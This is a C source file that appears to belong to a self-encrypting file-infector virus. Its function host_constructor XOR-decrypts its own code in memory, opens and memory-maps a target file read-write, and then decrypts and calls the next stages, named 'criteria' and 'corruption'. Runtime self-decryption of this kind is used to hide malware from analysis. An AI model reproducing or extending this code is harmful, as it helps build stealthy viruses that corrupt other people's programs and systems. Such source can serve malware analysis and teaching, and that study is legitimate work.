#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline void decrypt_right(const struct s_keychain *keychain, char *callee, const size_t size)
{
	for (register size_t index = 0; index < size; index++)
		callee[index] ^= keychain->key[RIGHT];
}

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void host_constructor(struct s_host *host, struct s_keychain *keychain, char *filename, enum e_context context)
{
#if LOGGER 
	ENTRY_LOGGER("host_constructor:\t");
#endif
	decrypt_right(keychain, (char *)find_host, (void *)host_constructor - (void *)find_host);

	if (context == FAILURE)
		goto label;

	int fd;
	struct stat statbuf;

	if ((fd = _open(filename, O_RDONLY, 0000)) < 0)
	{
		context = FAILURE;
		goto label;
	}
	if (_stat(filename, &statbuf) < 0)
	{
		context = FAILURE;
		goto label;
	}
	if ((host->header = _mmap(NULL, statbuf.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0)) == MAP_FAILED)
	{
		context = FAILURE;
		goto label;
	}

	host->filename = filename;
	host->filesize = statbuf.st_size;

label:
	_close(fd);

	update_keychain_right(keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);
	decrypt_right(keychain, (char *)criteria, (void *)corruption - (void *)criteria);

	criteria(host, keychain, context);
}
